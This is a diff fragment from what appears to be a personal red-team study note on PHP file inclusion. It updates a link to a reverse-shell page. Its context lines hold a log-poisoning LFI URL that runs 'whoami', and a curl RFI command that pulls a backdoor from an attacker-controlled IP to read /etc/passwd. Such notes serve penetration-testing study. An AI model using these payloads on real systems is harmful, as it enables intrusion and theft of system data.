@@ -207,7 +207,7 @@ allow_url_include = Off
 ```bash
 http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
 ```
-If vulnerable → [ReverseShell](ReverseShell.md)
+If vulnerable → [ReverseShell](03_RedTeam/04_Weaponization/ReverseShell.md)
 
 ```zsh
 curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=cat%20/etc/passwd"
